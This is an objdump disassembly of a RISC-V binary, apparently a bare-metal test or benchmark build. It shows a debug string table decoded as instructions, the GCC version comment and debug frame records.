 40a:	6d6d                	lui	s10,0x1b
 40c:	4d79                	li	s10,30
 40e:	6d65                	lui	s10,0x19
 410:	5f00                	lw	s0,56(a4)
 412:	656e                	ld	a0,216(sp)
 414:	685f0077          	0x685f0077
 418:	655f 7272 6f6e      	0x6f6e7272655f
 41e:	7300                	ld	s0,32(a4)
 420:	6f68                	ld	a0,216(a4)
 422:	7472                	ld	s0,312(sp)
 424:	6920                	ld	s0,80(a0)
 426:	746e                	ld	s0,248(sp)
 428:	5f00                	lw	s0,56(a4)
 42a:	745f 5f6d 6479      	0x64795f6d745f
 430:	7961                	lui	s2,0xffff8
 432:	5f00                	lw	s0,56(a4)
 434:	735f 7562 0066      	0x667562735f
 43a:	695f 626f 0073      	0x73626f695f
 440:	5f5f 4946 454c      	0x454c49465f5f
 446:	5f00                	lw	s0,56(a4)
 448:	626d                	lui	tp,0x1b
 44a:	74617473          	csrrci	s0,0x746,2
 44e:	5f65                	li	t5,-7
 450:	0074                	addi	a3,sp,12
 452:	5f5f 4673 4c49      	0x4c4946735f5f
 458:	0045                	c.nop	17
 45a:	6d5f 7362 6174      	0x617473626d5f
 460:	6574                	ld	a3,200(a0)
 462:	5f00                	lw	s0,56(a4)
 464:	6172                	ld	sp,280(sp)
 466:	646e                	ld	s0,216(sp)
 468:	6e5f 7865 0074      	0x7478656e5f
 46e:	6d5f 6c62 6e65      	0x6e656c626d5f
 474:	735f 6174 6574      	0x65746174735f
 47a:	5f00                	lw	s0,56(a4)
 47c:	6e69                	lui	t3,0x1a
 47e:	695f0063          	beq	t5,s5,afe <_tbss_end+0xa7a>
 482:	646e                	ld	s0,216(sp)
 484:	5f00                	lw	s0,56(a4)
 486:	6f6c                	ld	a1,216(a4)
 488:	656c6163          	bltu	s8,s6,aca <_tbss_end+0xa46>
 48c:	5f00                	lw	s0,56(a4)
 48e:	635f 656c 6e61      	0x6e61656c635f
 494:	7075                	c.lui	zero,0xffffd
 496:	5f00                	lw	s0,56(a4)
 498:	6e75                	lui	t3,0x1d
 49a:	63657073          	csrci	0x636,10
 49e:	6669                	lui	a2,0x1a
 4a0:	6569                	lui	a0,0x1a
 4a2:	5f64                	lw	s1,124(a4)
 4a4:	6f6c                	ld	a1,216(a4)
 4a6:	656c6163          	bltu	s8,s6,ae8 <_tbss_end+0xa64>
 4aa:	695f 666e 006f      	0x6f666e695f
 4b0:	6d5f 7861 6477      	0x647778616d5f
 4b6:	725f0073          	0x725f0073
 4ba:	6565                	lui	a0,0x19
 4bc:	746e                	ld	s0,248(sp)
 4be:	5f00                	lw	s0,56(a4)
 4c0:	64656573          	csrrsi	a0,0x646,10
 4c4:	5f00                	lw	s0,56(a4)
 4c6:	635f 756f 746e      	0x746e756f635f
 4cc:	5f00                	lw	s0,56(a4)
 4ce:	765f 6c61 6575      	0x65756c61765f
 4d4:	5f00                	lw	s0,56(a4)
 4d6:	6b656573          	csrrsi	a0,0x6b6,10
 4da:	5f00                	lw	s0,56(a4)
 4dc:	7066                	0x7066
 4de:	745f736f          	jal	t1,f8422 <_tbss_end+0xf839e>
 4e2:	5f00                	lw	s0,56(a4)
 4e4:	745f 5f6d 6579      	0x65795f6d745f
 4ea:	7261                	lui	tp,0xffff8
 4ec:	5f00                	lw	s0,56(a4)
 4ee:	745f 5f6d 696d      	0x696d5f6d745f
 4f4:	006e                	c.slli	zero,0x1b
 4f6:	78644963          	blt	s0,t1,c88 <_tbss_end+0xc04>
 4fa:	6f00                	ld	s0,24(a4)
 4fc:	7475                	lui	s0,0xffffd
 4fe:	6449                	lui	s0,0x12
 500:	4178                	lw	a4,68(a0)
 502:	7272                	ld	tp,312(sp)
 504:	7961                	lui	s2,0xffff8
 506:	5f00                	lw	s0,56(a4)
 508:	756d                	lui	a0,0xffffb
 50a:	746c                	ld	a1,232(s0)
 50c:	5f00                	lw	s0,56(a4)
 50e:	74727473          	csrrci	s0,0x747,4
 512:	6c5f6b6f          	jal	s6,f73d6 <_tbss_end+0xf7352>
 516:	7361                	lui	t1,0xffff8
 518:	0074                	addi	a3,sp,12
 51a:	6964                	ld	s1,208(a0)
 51c:	6666                	ld	a2,88(sp)
 51e:	5f00                	lw	s0,56(a4)
 520:	6e66                	ld	t3,88(sp)
 522:	7974                	ld	a3,240(a0)
 524:	6570                	ld	a2,200(a0)
 526:	615f0073          	0x615f0073
 52a:	6464                	ld	s1,200(s0)
 52c:	5f00                	lw	s0,56(a4)
 52e:	555f 6f4c 676e      	0x676e6f4c555f
 534:	5f00                	lw	s0,56(a4)
 536:	64746567          	0x64746567
 53a:	7461                	lui	s0,0xffff8
 53c:	5f65                	li	t5,-7
 53e:	7265                	lui	tp,0xffff9
 540:	0072                	c.slli	zero,0x1c
 542:	675f 6f6c 6162      	0x61626f6c675f
 548:	5f6c                	lw	a1,124(a4)
 54a:	6d69                	lui	s10,0x1a
 54c:	7570                	ld	a2,232(a0)
 54e:	6572                	ld	a0,280(sp)
 550:	705f 7274 6100      	0x61007274705f
 556:	696c                	ld	a1,208(a0)
 558:	64656e67          	0x64656e67
 55c:	654d                	lui	a0,0x13
 55e:	006d                	c.nop	27
 560:	755f 756e 6573      	0x6573756e755f
 566:	5f64                	lw	s1,124(a4)
 568:	6172                	ld	sp,280(sp)
 56a:	646e                	ld	s0,216(sp)
 56c:	5f00                	lw	s0,56(a4)
 56e:	00736477          	0x736477
 572:	5f5f 6d74 775f      	0x775f6d745f5f
 578:	6164                	ld	s1,192(a0)
 57a:	0079                	c.nop	30
 57c:	675f 756c 0065      	0x65756c675f
 582:	735f 6973 657a      	0x657a6973735f
 588:	745f 5f00 366c      	0x366c5f00745f
 58e:	6134                	ld	a3,64(a0)
 590:	625f 6675 5f00      	0x5f006675625f
 596:	5f676973          	csrrsi	s2,0x5f6,14
 59a:	7566                	ld	a0,120(sp)
 59c:	636e                	ld	t1,216(sp)
 59e:	5f00                	lw	s0,56(a4)
 5a0:	626e                	ld	tp,216(sp)
 5a2:	6675                	lui	a2,0x1d
 5a4:	5f00                	lw	s0,56(a4)
 5a6:	6e75                	lui	t3,0x1d
 5a8:	7375                	lui	t1,0xffffd
 5aa:	6465                	lui	s0,0x19
 5ac:	5f00                	lw	s0,56(a4)
 5ae:	745f 5f6d 7369      	0x73695f6d745f
 5b4:	7364                	ld	s1,224(a4)
 5b6:	0074                	addi	a3,sp,12
 5b8:	6c5f 636f 6c61      	0x6c61636f6c5f
 5be:	6974                	ld	a3,208(a0)
 5c0:	656d                	lui	a0,0x1b
 5c2:	625f 6675 5f00      	0x5f006675625f
 5c8:	736f6c63          	bltu	t5,s6,d00 <_tbss_end+0xc7c>
 5cc:	0065                	c.nop	25
 5ce:	725f 3834 7300      	0x73003834725f
 5d4:	6174                	ld	a3,192(a0)
 5d6:	7472                	ld	s0,312(sp)
 5d8:	5f00                	lw	s0,56(a4)
 5da:	626d                	lui	tp,0x1b
 5dc:	6f74                	ld	a3,216(a4)
 5de:	735f6377          	0x735f6377
 5e2:	6174                	ld	a3,192(a0)
 5e4:	6574                	ld	a3,200(a0)
 5e6:	7200                	ld	s0,32(a2)
 5e8:	7365                	lui	t1,0xffff9
 5ea:	6c75                	lui	s8,0x1d
 5ec:	7374                	ld	a3,224(a4)
 5ee:	5f00                	lw	s0,56(a4)
 5f0:	3570                	fld	fa2,232(a0)
 5f2:	72610073          	0x72610073
 5f6:	6172                	ld	sp,280(sp)
 5f8:	3179                	addiw	sp,sp,-2
 5fa:	735f 007a 616d      	0x616d007a735f
 600:	6e69                	lui	t3,0x1a
 602:	5f00                	lw	s0,56(a4)
 604:	745f 5f6d 646d      	0x646d5f6d745f
 60a:	7961                	lui	s2,0xffff8
 60c:	7300                	ld	s0,32(a4)
 60e:	6372                	ld	t1,280(sp)
 610:	7472632f          	0x7472632f
 614:	532e                	lw	t1,232(sp)
 616:	4700                	lw	s0,8(a4)
 618:	554e                	lw	a0,240(sp)
 61a:	4120                	lw	s0,64(a0)
 61c:	2e322053          	0x2e322053
 620:	3932                	fld	fs2,296(sp)
 622:	7300                	ld	s0,32(a4)
 624:	6372                	ld	t1,280(sp)
 626:	6174732f          	0x6174732f
 62a:	532e6b63          	bltu	t3,s2,b60 <_tbss_end+0xadc>
 62e:	6e00                	ld	s0,24(a2)
 630:	6d61                	lui	s10,0x18
 632:	0065                	c.nop	25
 634:	745f 736c 645f      	0x645f736c745f
 63a:	7461                	lui	s0,0xffff8
 63c:	0061                	c.nop	24
 63e:	6c727473          	csrrci	s0,0x6c7,4
 642:	6e65                	lui	t3,0x19
 644:	7000                	ld	s0,32(s0)
 646:	6972                	ld	s2,280(sp)
 648:	746e                	ld	s0,248(sp)
 64a:	7241                	lui	tp,0xffff0
 64c:	6172                	ld	sp,280(sp)
 64e:	0079                	c.nop	30
 650:	73756163          	bltu	a0,s7,d72 <_tbss_end+0xcee>
 654:	0065                	c.nop	25
 656:	6e727473          	csrrci	s0,0x6e7,4
 65a:	656c                	ld	a1,200(a0)
 65c:	006e                	c.slli	zero,0x1b
 65e:	7270                	ld	a2,224(a2)
 660:	7365636f          	jal	t1,56d96 <_tbss_end+0x56d12>
 664:	72705f73          	csrrwi	t5,0x727,0
 668:	6365                	lui	t1,0x19
 66a:	7369                	lui	t1,0xffffa
 66c:	6f69                	lui	t5,0x1a
 66e:	006e                	c.slli	zero,0x1b
 670:	6474                	ld	a3,200(s0)
 672:	7461                	lui	s0,0xffff8
 674:	5f61                	li	t5,-8
 676:	657a6973          	csrrsi	s2,0x657,20
 67a:	5f00                	lw	s0,56(a4)
 67c:	6474                	ld	a3,200(s0)
 67e:	7461                	lui	s0,0xffff8
 680:	5f61                	li	t5,-8
 682:	6e65                	lui	t3,0x19
 684:	0064                	addi	s1,sp,12
 686:	75746567          	0x75746567
 68a:	6e69                	lui	t3,0x1a
 68c:	0074                	addi	a3,sp,12
 68e:	7570                	ld	a2,232(a0)
 690:	6374                	ld	a3,192(a4)
 692:	6168                	ld	a0,192(a0)
 694:	0072                	c.slli	zero,0x1c
 696:	6572                	ld	a0,280(sp)
 698:	70007367          	0x70007367
 69c:	6972                	ld	s2,280(sp)
 69e:	746e                	ld	s0,248(sp)
 6a0:	00727473          	csrrci	s0,0x7,4
 6a4:	6162                	ld	sp,24(sp)
 6a6:	7272                	ld	tp,312(sp)
 6a8:	6569                	lui	a0,0x1a
 6aa:	0072                	c.slli	zero,0x1c
 6ac:	6168                	ld	a0,192(a0)
 6ae:	646e                	ld	s0,216(sp)
 6b0:	656c                	ld	a1,200(a0)
 6b2:	745f 6172 0070      	0x706172745f
 6b8:	6874                	ld	a3,208(s0)
 6ba:	6572                	ld	a0,280(sp)
 6bc:	6461                	lui	s0,0x18
 6be:	655f 746e 7972      	0x7972746e655f
 6c4:	7300                	ld	s0,32(a4)
 6c6:	7274                	ld	a3,224(a2)
 6c8:	00797063          	bleu	t2,s2,6c8 <_tbss_end+0x644>
 6cc:	7270                	ld	a2,224(a2)
 6ce:	6e69                	lui	t3,0x1a
 6d0:	6e74                	ld	a3,216(a2)
 6d2:	6d75                	lui	s10,0x1d
 6d4:	6500                	ld	s0,8(a0)
 6d6:	616e                	ld	sp,216(sp)
 6d8:	6c62                	ld	s8,24(sp)
 6da:	0065                	c.nop	25
 6dc:	6261                	lui	tp,0x18
 6de:	0074726f          	jal	tp,47ee4 <_tbss_end+0x47e60>
 6e2:	5f5f 6e67 6375      	0x63756e675f5f
 6e8:	765f 5f61 696c      	0x696c5f61765f
 6ee:	70007473          	csrrci	s0,0x700,0
 6f2:	6461                	lui	s0,0x18
 6f4:	72730063          	beq	t1,t2,e14 <_tbss_end+0xd90>
 6f8:	79732f63          	0x79732f63
 6fc:	6c616373          	csrrsi	t1,0x6c6,2
 700:	736c                	ld	a1,224(a4)
 702:	632e                	ld	t1,200(sp)
 704:	7700                	ld	s0,40(a4)
 706:	6469                	lui	s0,0x1a
 708:	6874                	ld	a3,208(s0)
 70a:	7300                	ld	s0,32(a4)
 70c:	7274                	ld	a3,224(a2)
 70e:	0030                	addi	a2,sp,8
 710:	6e756f63          	bltu	a0,t2,e0e <_tbss_end+0xd8a>
 714:	6574                	ld	a3,200(a0)
 716:	7372                	ld	t1,312(sp)
 718:	6300                	ld	s0,0(a4)
 71a:	0065646f          	jal	s0,56720 <_tbss_end+0x5669c>
 71e:	666c                	ld	a1,200(a2)
 720:	6c007273          	csrrci	tp,0x6c0,0
 724:	7361                	lui	t1,0xffff8
 726:	5f74                	lw	a3,124(a4)
 728:	6d66                	ld	s10,88(sp)
 72a:	0074                	addi	a3,sp,12
 72c:	7562                	ld	a0,56(sp)
 72e:	6c66                	ld	s8,88(sp)
 730:	6e65                	lui	t3,0x19
 732:	7200                	ld	s0,32(a2)
 734:	7365                	lui	t1,0xffff9
 736:	63746977          	0x63746977
 73a:	0068                	addi	a0,sp,12
 73c:	63727473          	csrrci	s0,0x637,4
 740:	706d                	c.lui	zero,0xffffb
 742:	7000                	ld	s0,32(s0)
 744:	6972                	ld	s2,280(sp)
 746:	746e                	ld	s0,248(sp)
 748:	6f44                	ld	s1,152(a4)
 74a:	6275                	lui	tp,0x1d
 74c:	656c                	ld	a1,200(a0)
 74e:	7241                	lui	tp,0xffff0
 750:	6172                	ld	sp,280(sp)
 752:	0079                	c.nop	30
 754:	666c                	ld	a1,200(a2)
 756:	616c                	ld	a1,192(a0)
 758:	73700067          	jr	1847(zero) # 737 <_tbss_end+0x6b3>
 75c:	7274                	ld	a3,224(a2)
 75e:	6d00                	ld	s0,24(a0)
 760:	6d65                	lui	s10,0x19
 762:	00746573          	csrrsi	a0,0x7,8
 766:	7261                	lui	tp,0xffff8
 768:	61003067          	0x61003067
 76c:	6772                	ld	a4,280(sp)
 76e:	0031                	c.nop	12
 770:	7261                	lui	tp,0xffff8
 772:	5f003267          	0x5f003267
 776:	6e69                	lui	t3,0x1a
 778:	7469                	lui	s0,0xffffa
 77a:	7300                	ld	s0,32(a4)
 77c:	7379                	lui	t1,0xffffe
 77e:	6c6c6163          	bltu	s8,t1,e40 <_tbss_end+0xdbc>
 782:	7600                	ld	s0,40(a2)
 784:	7265                	lui	tp,0xffff9
 786:	6669                	lui	a2,0x1a
 788:	4479                	li	s0,30
 78a:	6c62756f          	jal	a0,27e50 <_tbss_end+0x27dcc>
 78e:	0065                	c.nop	25
 790:	69746567          	0x69746567
 794:	746e                	ld	s0,248(sp)
 796:	7500                	ld	s0,40(a0)
 798:	736e                	ld	t1,248(sp)
 79a:	6769                	lui	a4,0x1a
 79c:	656e                	ld	a0,216(sp)
 79e:	5f64                	lw	s1,124(a4)
 7a0:	756e                	ld	a0,248(sp)
 7a2:	626d                	lui	tp,0x1b
 7a4:	7265                	lui	tp,0xffff9
 7a6:	7000                	ld	s0,32(s0)
 7a8:	7475                	lui	s0,0xffffd
 7aa:	6164                	ld	s1,192(a0)
 7ac:	0074                	addi	a3,sp,12
 7ae:	7261                	lui	tp,0xffff8
 7b0:	77006367          	0x77006367
 7b4:	6968                	ld	a0,208(a0)
 7b6:	61006863          	bltu	zero,a6,dc6 <_tbss_end+0xd42>
 7ba:	6772                	ld	a4,280(sp)
 7bc:	0076                	c.slli	zero,0x1d
 7be:	69727073          	csrci	0x697,4
 7c2:	746e                	ld	s0,248(sp)
 7c4:	0066                	c.slli	zero,0x19
 7c6:	745f 6164 6174      	0x61746164745f
 7cc:	625f 6765 6e69      	0x6e696765625f
 7d2:	6e00                	ld	s0,24(a2)
 7d4:	65726f63          	bltu	tp,s7,e32 <_tbss_end+0xdae>
 7d8:	5f5f0073          	0x5f5f0073
 7dc:	6975                	lui	s2,0x1d
 7de:	746e                	ld	s0,248(sp)
 7e0:	7470                	ld	a2,232(s0)
 7e2:	5f72                	lw	t5,60(sp)
 7e4:	0074                	addi	a3,sp,12
 7e6:	6c61                	lui	s8,0x18
 7e8:	6674                	ld	a3,200(a2)
 7ea:	616c                	ld	a1,192(a0)
 7ec:	62740067          	jr	1575(s0) # ffffffffffffd627 <_end+0xffffffff7ffe2427>
 7f0:	735f7373          	csrrci	t1,0x735,30
 7f4:	7a69                	lui	s4,0xffffa
 7f6:	0065                	c.nop	25
 7f8:	6874                	ld	a3,208(s0)
 7fa:	6572                	ld	a0,280(sp)
 7fc:	6461                	lui	s0,0x18
 7fe:	705f 696f 746e      	0x746e696f705f
 804:	7265                	lui	tp,0xffff9
 806:	6300                	ld	s0,0(a4)
 808:	746e756f          	jal	a0,e7f4e <_tbss_end+0xe7eca>
 80c:	7265                	lui	tp,0xffff9
 80e:	6e5f 6d61 7365      	0x73656d616e5f
 814:	7700                	ld	s0,40(a4)
 816:	0064726f          	jal	tp,4781c <_tbss_end+0x47798>
 81a:	745f 7362 5f73      	0x5f737362745f
 820:	6e65                	lui	t3,0x19
 822:	0064                	addi	s1,sp,12
 824:	6f74                	ld	a3,216(a4)
 826:	6f68                	ld	a0,216(a4)
 828:	64007473          	csrrci	s0,0x640,0
 82c:	6769                	lui	a4,0x1a
 82e:	70730073          	0x70730073
 832:	6972                	ld	s2,280(sp)
 834:	746e                	ld	s0,248(sp)
 836:	5f66                	lw	t5,120(sp)
 838:	7570                	ld	a2,232(a0)
 83a:	6374                	ld	a3,192(a4)
 83c:	0068                	addi	a0,sp,12
 83e:	7962                	ld	s2,56(sp)
 840:	6574                	ld	a3,200(a0)
 842:	7000                	ld	s0,32(s0)
 844:	6972                	ld	s2,280(sp)
 846:	746e                	ld	s0,248(sp)
 848:	6568                	ld	a0,200(a0)
 84a:	0078                	addi	a4,sp,12
 84c:	6874                	ld	a3,208(s0)
 84e:	6572                	ld	a0,280(sp)
 850:	6461                	lui	s0,0x18
 852:	736e6573          	csrrsi	a0,0x736,28
 856:	0065                	c.nop	25
 858:	6574                	ld	a3,200(a0)
 85a:	70007473          	csrrci	s0,0x700,0
 85e:	7562                	ld	a0,56(sp)
 860:	0066                	c.slli	zero,0x19
 862:	6e69                	lui	t3,0x1a
 864:	7469                	lui	s0,0xffffa
 866:	745f 736c 6d00      	0x6d00736c745f
 86c:	6761                	lui	a4,0x18
 86e:	6369                	lui	t1,0x1a
 870:	6d5f 6d65 7400      	0x74006d656d5f
 876:	736f686f          	jal	a6,f6fac <_tbss_end+0xf6f28>
 87a:	5f74                	lw	a3,124(a4)
 87c:	7865                	lui	a6,0xffff9
 87e:	7469                	lui	s0,0xffffa
 880:	6600                	ld	s0,8(a2)
 882:	6f72                	ld	t5,280(sp)
 884:	686d                	lui	a6,0x1b
 886:	0074736f          	jal	t1,4808c <_tbss_end+0x48008>
 88a:	656d                	lui	a0,0x1b
 88c:	636d                	lui	t1,0x1b
 88e:	7970                	ld	a2,240(a0)
 890:	6100                	ld	s0,0(a0)
 892:	6f74                	ld	a3,216(a4)
 894:	006c                	addi	a1,sp,12
 896:	53746573          	csrrsi	a0,0x537,8
 89a:	6174                	ld	a3,192(a0)
 89c:	7374                	ld	a3,224(a4)
 89e:	5f00                	lw	s0,56(a4)
 8a0:	625f 6975 746c      	0x746c6975625f
 8a6:	6e69                	lui	t3,0x1a
 8a8:	765f 5f61 696c      	0x696c5f61765f
 8ae:	76007473          	csrrci	s0,0x760,0
 8b2:	7265                	lui	tp,0xffff9
 8b4:	6669                	lui	a2,0x1a
 8b6:	0079                	c.nop	30
 8b8:	6564                	ld	s1,200(a0)
 8ba:	76007473          	csrrci	s0,0x760,0
 8be:	7270                	ld	a2,224(a2)
 8c0:	6e69                	lui	t3,0x1a
 8c2:	6674                	ld	a3,200(a2)
 8c4:	746d                	lui	s0,0xffffb
	...

Disassembly of section .comment:

0000000000000000 <.comment>:
   0:	3a434347          	fmsub.d	ft6,ft6,ft4,ft7,rmm
   4:	2820                	fld	fs0,80(s0)
   6:	29554e47          	fmsub.s	ft8,fa0,fs5,ft5,rmm
   a:	3720                	fld	fs0,104(a4)
   c:	322e                	fld	ft4,232(sp)
   e:	302e                	fld	ft0,232(sp)
	...

Disassembly of section .debug_frame:

0000000000000000 <.debug_frame>:
   0:	000c                	0xc
   2:	0000                	unimp
   4:	ffff                	0xffff
   6:	ffff                	0xffff
   8:	0001                	nop
   a:	7c01                	lui	s8,0xfffe0
   c:	0d01                	addi	s10,s10,0
   e:	0002                	c.slli	zero,0x0
  10:	0024                	addi	s1,sp,8
  12:	0000                	unimp
  14:	0000                	unimp
  16:	0000                	unimp
  18:	1048                	addi	a0,sp,36
  1a:	8000                	0x8000
  1c:	0000                	unimp
  1e:	0000                	unimp
  20:	00ce                	slli	ra,ra,0x13
  22:	0000                	unimp
  24:	0000                	unimp
  26:	0000                	unimp
  28:	0e42                	slli	t3,t3,0x10
  2a:	4260                	lw	s0,68(a2)
  2c:	0288                	addi	a0,sp,320
  2e:	0c42                	slli	s8,s8,0x10
  30:	0008                	0x8
  32:	c402                	sw	zero,8(sp)
  34:	42c8                	lw	a0,4(a3)
  36:	020d                	addi	tp,tp,3
  38:	0024                	addi	s1,sp,8
  3a:	0000                	unimp
  3c:	0000                	unimp
  3e:	0000                	unimp
  40:	1116                	slli	sp,sp,0x25
  42:	8000                	0x8000
  44:	0000                	unimp
  46:	0000                	unimp
  48:	00ec                	addi	a1,sp,76
  4a:	0000                	unimp
  4c:	0000                	unimp
  4e:	0000                	unimp
  50:	0e42                	slli	t3,t3,0x10
  52:	4240                	lw	s0,4(a2)
  54:	0288                	addi	a0,sp,320
  56:	0c42                	slli	s8,s8,0x10
  58:	0008                	0x8
  5a:	e202                	sd	zero,256(sp)
  5c:	42c8                	lw	a0,4(a3)
  5e:	020d                	addi	tp,tp,3
  60:	0024                	addi	s1,sp,8
  62:	0000                	unimp
  64:	0000                	unimp
  66:	0000                	unimp
  68:	1202                	slli	tp,tp,0x20
  6a:	8000                	0x8000
  6c:	0000                	unimp
  6e:	0000                	unimp
  70:	00c0                	addi	s0,sp,68
  72:	0000                	unimp
  74:	0000                	unimp
  76:	0000                	unimp
  78:	0e42                	slli	t3,t3,0x10
  7a:	4240                	lw	s0,4(a2)
  7c:	0288                	addi	a0,sp,320
  7e:	0c42                	slli	s8,s8,0x10
  80:	0008                	0x8
  82:	b602                	fsd	ft0,296(sp)
  84:	42c8                	lw	a0,4(a3)
  86:	020d                	addi	tp,tp,3
  88:	002c                	addi	a1,sp,8
  8a:	0000                	unimp
  8c:	0000                	unimp
  8e:	0000                	unimp
  90:	12c2                	slli	t0,t0,0x30
  92:	8000                	0x8000
  94:	0000                	unimp
  96:	0000                	unimp
  98:	01e6                	slli	gp,gp,0x19
  9a:	0000                	unimp
  9c:	0000                	unimp
  9e:	0000                	unimp
  a0:	0e42                	slli	t3,t3,0x10
  a2:	0180                	addi	s0,sp,192
  a4:	8144                	0x8144
  a6:	8802                	jr	a6
  a8:	4204                	lw	s1,0(a2)
  aa:	080c                	addi	a1,sp,16
  ac:	0300                	addi	s0,sp,384
  ae:	01d8                	addi	a4,sp,196
  b0:	42c1                	li	t0,16
  b2:	42c8                	lw	a0,4(a3)
  b4:	020d                	addi	tp,tp,3
  b6:	0000                	unimp
  b8:	000c                	0xc
  ba:	0000                	unimp
  bc:	ffff                	0xffff
  be:	ffff                	0xffff
  c0:	0001                	nop
  c2:	7c01                	lui	s8,0xfffe0
  c4:	0d01                	addi	s10,s10,0
  c6:	0002                	c.slli	zero,0x0
  c8:	0024                	addi	s1,sp,8
  ca:	0000                	unimp
  cc:	00b8                	addi	a4,sp,72
  ce:	0000                	unimp
  d0:	14d6                	slli	s1,s1,0x35
  d2:	8000                	0x8000
  d4:	0000                	unimp
  d6:	0000                	unimp
  d8:	001c                	0x1c
  da:	0000                	unimp
  dc:	0000                	unimp
  de:	0000                	unimp
  e0:	0e42                	slli	t3,t3,0x10
  e2:	4230                	lw	a2,64(a2)
  e4:	0288                	addi	a0,sp,320
  e6:	0c42                	slli	s8,s8,0x10
  e8:	0008                	0x8
  ea:	c852                	sw	s4,16(sp)
  ec:	0d42                	slli	s10,s10,0x10
  ee:	0002                	c.slli	zero,0x0
  f0:	0024                	addi	s1,sp,8
  f2:	0000                	unimp
  f4:	00b8                	addi	a4,sp,72
  f6:	0000                	unimp
  f8:	14f2                	slli	s1,s1,0x3c
  fa:	8000                	0x8000
  fc:	0000                	unimp
  fe:	0000                	unimp
 100:	001c                	0x1c
 102:	0000                	unimp
 104:	0000                	unimp
 106:	0000                	unimp
 108:	0e42                	slli	t3,t3,0x10
 10a:	4230                	lw	a2,64(a2)
 10c:	0288                	addi	a0,sp,320
 10e:	0c42                	slli	s8,s8,0x10
 110:	0008                	0x8
 112:	c852                	sw	s4,16(sp)
 114:	0d42                	slli	s10,s10,0x10
 116:	0002                	c.slli	zero,0x0
 118:	002c                	addi	a1,sp,8
 11a:	0000                	unimp
 11c:	00b8                	addi	a4,sp,72
 11e:	0000                	unimp
 120:	150e                	slli	a0,a0,0x23
 122:	8000                	0x8000
 124:	0000                	unimp
 126:	0000                	unimp
 128:	010a                	slli	sp,sp,0x2
 12a:	0000                	unimp
 12c:	0000                	unimp
 12e:	0000                	unimp
 130:	0e42                	slli	t3,t3,0x10
 132:	4250                	lw	a2,4(a2)
 134:	0288                	addi	a0,sp,320
 136:	0c42                	slli	s8,s8,0x10
 138:	0008                	0x8
 13a:	c8010003          	lb	zero,-896(sp)
 13e:	0d42                	slli	s10,s10,0x10
 140:	0002                	c.slli	zero,0x0
 142:	0000                	unimp
 144:	0000                	unimp
 146:	0000                	unimp
 148:	002c                	addi	a1,sp,8
 14a:	0000                	unimp
 14c:	00b8                	addi	a4,sp,72
 14e:	0000                	unimp
 150:	1618                	addi	a4,sp,800
 152:	8000                	0x8000
 154:	0000                	unimp
 156:	0000                	unimp
 158:	0122                	slli	sp,sp,0x8
 15a:	0000                	unimp
 15c:	0000                	unimp
 15e:	0000                	unimp
 160:	0e42                	slli	t3,t3,0x10
 162:	4260                	lw	s0,68(a2)
 164:	0288                	addi	a0,sp,320
 166:	0c42                	slli	s8,s8,0x10
 168:	0008                	0x8
 16a:	c8011803          	lh	a6,-896(sp)
 16e:	0d42                	slli	s10,s10,0x10
 170:	0002                	c.slli	zero,0x0
 172:	0000                	unimp
 174:	0000                	unimp
 176:	0000                	unimp
 178:	0024                	addi	s1,sp,8
 17a:	0000                	unimp
 17c:	00b8                	addi	a4,sp,72
 17e:	0000                	unimp
 180:	173a                	slli	a4,a4,0x2e
 182:	8000                	0x8000
 184:	0000                	unimp
 186:	0000                	unimp
 188:	008a                	slli	ra,ra,0x2
 18a:	0000                	unimp
 18c:	0000                	unimp
 18e:	0000                	unimp
 190:	0e42                	slli	t3,t3,0x10
 192:	4220                	lw	s0,64(a2)
 194:	0288                	addi	a0,sp,320
 196:	0c42                	slli	s8,s8,0x10
 198:	0008                	0x8
 19a:	8002                	0x8002
 19c:	42c8                	lw	a0,4(a3)
 19e:	020d                	addi	tp,tp,3
 1a0:	0024                	addi	s1,sp,8
 1a2:	0000                	unimp
 1a4:	00b8                	addi	a4,sp,72
 1a6:	0000                	unimp
 1a8:	17c4                	addi	s1,sp,996
 1aa:	8000                	0x8000
 1ac:	0000                	unimp
 1ae:	0000                	unimp
 1b0:	0036                	c.slli	zero,0xd
 1b2:	0000                	unimp
 1b4:	0000                	unimp
 1b6:	0000                	unimp
 1b8:	0e42                	slli	t3,t3,0x10
 1ba:	4230                	lw	a2,64(a2)
 1bc:	0288                	addi	a0,sp,320
 1be:	0c42                	slli	s8,s8,0x10
 1c0:	0008                	0x8
 1c2:	c86c                	sw	a1,84(s0)
 1c4:	0d42                	slli	s10,s10,0x10
 1c6:	0002                	c.slli	zero,0x0
 1c8:	002c                	addi	a1,sp,8
 1ca:	0000                	unimp
 1cc:	00b8                	addi	a4,sp,72
 1ce:	0000                	unimp
 1d0:	17fa                	slli	a5,a5,0x3e
 1d2:	8000                	0x8000
 1d4:	0000                	unimp
 1d6:	0000                	unimp
 1d8:	0076                	c.slli	zero,0x1d
 1da:	0000                	unimp
 1dc:	0000                	unimp
 1de:	0000                	unimp
 1e0:	0e42                	slli	t3,t3,0x10
 1e2:	01b0                	addi	a2,sp,200
 1e4:	8842                	mv	a6,a6
 1e6:	4202                	lw	tp,0(sp)
 1e8:	080c                	addi	a1,sp,16
 1ea:	0200                	addi	s0,sp,256
 1ec:	c86c                	sw	a1,84(s0)
 1ee:	0d42                	slli	s10,s10,0x10
 1f0:	0002                	c.slli	zero,0x0
 1f2:	0000                	unimp
 1f4:	0000                	unimp
 1f6:	0000                	unimp
 1f8:	002c                	addi	a1,sp,8
 1fa:	0000                	unimp
 1fc:	00b8                	addi	a4,sp,72
 1fe:	0000                	unimp
 200:	1870                	addi	a2,sp,60
 202:	8000                	0x8000
 204:	0000                	unimp
 206:	0000                	unimp
 208:	0110                	addi	a2,sp,128
 20a:	0000                	unimp
 20c:	0000                	unimp
 20e:	0000                	unimp
 210:	0e42                	slli	t3,t3,0x10
 212:	4250                	lw	a2,4(a2)
 214:	0288                	addi	a0,sp,320
 216:	0c42                	slli	s8,s8,0x10
 218:	0008                	0x8
 21a:	c8010603          	lb	a2,-896(sp)
 21e:	0d42                	slli	s10,s10,0x10
 220:	0002                	c.slli	zero,0x0
 222:	0000                	unimp
 224:	0000                	unimp
 226:	0000                	unimp
 228:	0024                	addi	s1,sp,8
 22a:	0000                	unimp
 22c:	00b8                	addi	a4,sp,72
 22e:	0000                	unimp
 230:	1980                	addi	s0,sp,240
 232:	8000                	0x8000
 234:	0000                	unimp
 236:	0000                	unimp
 238:	0020                	addi	s0,sp,8
 23a:	0000                	unimp
 23c:	0000                	unimp
 23e:	0000                	unimp
 240:	0e42                	slli	t3,t3,0x10
 242:	4220                	lw	s0,64(a2)
 244:	0288                	addi	a0,sp,320
 246:	0c42                	slli	s8,s8,0x10
 248:	0008                	0x8
 24a:	0000                	unimp
